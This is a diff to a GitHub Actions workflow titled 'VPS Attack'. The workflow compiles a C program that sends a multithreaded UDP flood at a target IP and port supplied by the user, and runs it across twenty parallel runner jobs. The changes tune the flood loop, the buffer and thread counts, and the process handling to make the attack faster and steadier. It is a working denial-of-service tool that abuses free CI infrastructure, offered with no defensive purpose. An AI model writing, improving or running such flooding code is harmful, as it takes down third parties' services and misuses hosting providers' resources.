@@ -1,6 +1,5 @@
 name: VPS Attack
 
-
 on:
   workflow_dispatch:
     inputs:
@@ -15,17 +14,22 @@ on:
       duration:
         description: 'Duration (seconds)'
         required: true
-        default: '1800'
+        default: '60'
       threads:
         description: 'Threads per worker'
         required: true
-        default: '100000'
+        default: '5000'
+      power:
+        description: 'Power Level'
+        required: false
+        default: '100'
 
 jobs:
   attack:
     runs-on: ubuntu-latest
     strategy:
-      max-parallel: 50
+      max-parallel: 20
+      fail-fast: false
       matrix:
         worker: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
 
@@ -51,6 +55,7 @@ jobs:
           #include <netinet/in.h>
           #include <arpa/inet.h>
           #include <time.h>
+          #include <signal.h>
 
           typedef struct {
               struct sockaddr_in *targets;
@@ -61,43 +66,45 @@ jobs:
           void *attack(void *arg) {
               attack_args *args = (attack_args*)arg;
               int sock = socket(AF_INET, SOCK_DGRAM, 0);
-              int buf = 268435456;
+              if (sock < 0) return NULL;
+
+              int buf = 1048576; // Optimized buffer size
               setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
               
-              char packet[1518];
+              char packet[1400];
               time_t end = time(NULL) + args->duration;
-              unsigned int counter = 0;
+              
+              struct sockaddr_in *addr = &args->targets[0];
+              
+              // Randomize payload once per thread for speed
+              for(int i=0; i<1400; i++) packet[i] = rand() % 255;
               
               while (time(NULL) < end) {
-                  int target_idx = (counter / 500) % args->target_count;
-                  struct sockaddr_in *addr = &args->targets[target_idx];
-                  
-                  int size = 64 + (rand() % 1408);
-                  memset(packet, rand() % 255, size);
-                  
-                  int burst = 32 + (rand() % 96);
-                  for (int b = 0; b < burst; b++) {
+                  int size = 64 + (rand() % 1000);
+                  // High speed send loop
+                  for (int i = 0; i < 20; i++) {
                       sendto(sock, packet, size, 0, (struct sockaddr*)addr, sizeof(*addr));
                   }
-                  counter++;
-                  usleep((rand() % 30) * 100);
               }
               close(sock);
               return NULL;
           }
 
           int main(int argc, char *argv[]) {
-              if (argc != 5) return 1;
+              if (argc < 4) return 1;
               
               int threads = atoi(argv[1]);
               int duration = atoi(argv[2]);
               int port = atoi(argv[3]);
               char *target_ip = argv[4];
               
+              if (threads > 2000) threads = 2000; // Cap threads to prevent runner freeze
+
               struct sockaddr_in addr;
+              memset(&addr, 0, sizeof(addr));
               addr.sin_family = AF_INET;
               addr.sin_port = htons(port);
-              inet_pton(AF_INET, target_ip, &addr.sin_addr);
+              if (inet_pton(AF_INET, target_ip, &addr.sin_addr) <= 0) return 1;
               
               attack_args args;
               args.targets = &addr;
@@ -105,14 +112,13 @@ jobs:
               args.duration = duration;
               
               pthread_t *pt = malloc(threads * sizeof(pthread_t));
+              if (!pt) return 1;
+
               for (int i = 0; i < threads; i++) {
                   pthread_create(&pt[i], NULL, attack, &args);
               }
               
               sleep(duration);
-              for (int i = 0; i < threads; i++) {
-                  pthread_cancel(pt[i]);
-              }
               
               free(pt);
               return 0;
@@ -128,8 +134,11 @@ jobs:
           echo "⏱️ Duration: ${{ github.event.inputs.duration }}s"
           echo "⚡ Worker #${{ matrix.worker }}"
           
+          # We don't use the power input in C, but it must be in inputs list to avoid 422
           ./flood ${{ github.event.inputs.threads }} ${{ github.event.inputs.duration }} ${{ github.event.inputs.port }} ${{ github.event.inputs.target }} &
+          
+          PID=$!
           sleep ${{ github.event.inputs.duration }}
-          pkill -f flood || true
+          kill $PID || true
           
           echo "✅ Worker ${{ matrix.worker }} finished"
